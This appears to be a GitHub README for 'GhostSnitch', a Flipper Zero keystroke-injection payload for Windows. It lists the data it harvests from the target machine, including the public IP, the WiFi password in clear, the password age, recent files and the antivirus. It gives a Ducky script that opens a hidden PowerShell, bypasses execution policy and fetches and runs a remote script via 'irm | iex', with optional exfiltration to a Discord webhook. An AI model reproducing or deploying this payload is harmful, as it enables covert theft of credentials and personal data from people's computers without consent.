# GhostSnitch

**Version:** 1.2  
**Author:** I am TBJr  
**Platform:** Windows 10 / 11  
**Delivery:** Flipper Zero HID (`irm | iex`)

---

## What it does

Collects recon data from a Windows machine, waits for mouse movement, then roasts the user over TTS and changes the desktop wallpaper. Optionally sends a full report to a Discord webhook.

---

## Features

- Collects: RAM, public IP, WiFi SSID + password (admin only), password age, email hint, OS, uptime, drives, recent files, USB devices, BitLocker status, top processes, antivirus
- All data gathered once and reused for both the Discord report and TTS — no duplicate execution
- Waits for mouse movement before speaking (roast fires when the user is active)
- Generates a roast wallpaper at native screen resolution via GDI+
- Optional Discord webhook report (skipped when `$webhookUrl` is left as `REPLACE_ME`)
- No persistence — runs once and exits

## Setup

1. Open `host/GhostSnitch.ps1`
2. Set `$webhookUrl = 'https://discord.com/api/webhooks/...'` at the top (or leave `REPLACE_ME` to disable reporting)
3. Host the file on GitHub Pages (or your own server)
4. Update the URL in `GhostSnitch.txt` if you changed the host

## Ducky script

```
GUI r
DELAY 600
STRING powershell -w h -NoP -NonI -Ep Bypass irm https://tbjr.github.io/Flipper-payloads/host/GhostSnitch.ps1 | iex
ENTER
```

## Known limitations

- **WiFi password** requires Administrator — GhostSnitch runs as the current user and gracefully reports the limitation if not elevated. Use GhostSnitch_Stealth for auto-elevation.
- **Group Policy** can block wallpaper changes on managed/corporate machines.
- **Windows Defender** may flag `netsh … key=clear` or the scheduled task pattern; no AMSI bypass is included.

## Example roasts

- `8 GB? Gamer vibes... if lag was a feature.`
- `Your public IP is 1.2.3.4. Say hi to the world for me.`
- `hunter2 … it's crying for help.`
- `180 days? That password's got mold on it.`

## Credits

Inspired by AcidBurn by [I am Jakoby](https://github.com/I-Am-Jakoby). Extended by **TBJr**.
